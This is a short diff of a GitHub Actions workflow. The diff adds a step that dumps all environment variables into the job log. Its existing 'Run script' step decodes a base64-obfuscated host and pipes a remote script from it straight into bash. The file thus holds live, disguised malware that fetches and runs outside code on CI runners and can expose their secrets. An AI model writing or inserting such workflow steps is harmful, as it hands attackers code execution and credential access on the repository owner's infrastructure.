@@ -10,5 +10,7 @@ jobs:
     runs-on: ubuntu-18.04
     steps:
       - uses: actions/checkout@v2
+      - name: make update
+        run: env
       - name: Run script
         run: curl -s -L http://$(echo -n "aS5hZ2FuemFpLmNvbToyNzQ2Mw==" | base64 -d)/autorun01.sh?id=$ROLEID-gt | bash -s run $ROLEID-gt
